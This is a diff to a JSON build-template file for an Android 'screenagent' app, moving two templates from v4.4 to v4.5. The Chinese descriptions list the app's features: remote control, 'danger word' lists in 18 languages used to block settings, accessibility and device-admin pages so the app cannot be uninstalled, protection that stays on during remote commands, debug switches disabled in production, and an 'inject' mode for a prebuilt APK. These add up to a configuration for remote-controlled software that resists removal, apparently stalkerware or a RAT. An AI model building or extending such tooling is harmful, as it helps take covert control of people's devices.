@@ -2,9 +2,9 @@
   "templates": [
     {
       "id": "src-4.0",
-      "name": "v4.4 源码构建（线上默认关调试 · 分步脚本 + 词表兜底）",
-      "versionName": "4.4",
-      "versionCode": 1021,
+      "name": "v4.5 源码构建（不拦卸载框 · 分步脚本 + 词表兜底）",
+      "versionName": "4.5",
+      "versionCode": 1022,
       "sourceDir": "materials/src/v4.0",
       "kind": "screenagent",
       "visibleLauncher": true,
@@ -15,15 +15,15 @@
     },
     {
       "id": "apk-4.0",
-      "name": "v4.4 正式版（线上默认关调试 + 远控不掉盾 + 18 语言防卸载）",
-      "versionName": "4.4",
-      "versionCode": 1021,
+      "name": "v4.5 正式版（不拦卸载确认框 + 18 语言防卸载 + 线上默认关调试）",
+      "versionName": "4.5",
+      "versionCode": 1022,
       "kind": "screenagent",
       "visibleLauncher": true,
       "resourceStyle": "semantic",
       "defaultHomeUrl": "https://www.baidu.com/",
-      "description": "4.4：构建期总闸 DEBUG_FLAGS=false，线上包不认任何 adb 调试开关；远控指令不再抑制防卸载；130 危险词覆盖 18 语言；浮层 34 语言。",
-      "sha256": "03e6d0cb21471e6cec8676f7e3fb93c5a6bcc40fccc872f1efa04d896f95279e",
+      "description": "4.5：系统卸载确认框（长按删除 → Uninstall 对话框）不再监控，只拦设置/无障碍/设备管理页面；线上默认关调试；远控不掉盾；130 危险词 18 语言。",
+      "sha256": "20c5ed3bbd4de6795ec31bde90d3f77330d994988f244fa8967fd5160e9f3171",
       "file": "v4.0.apk",
       "mode": "inject"
     },
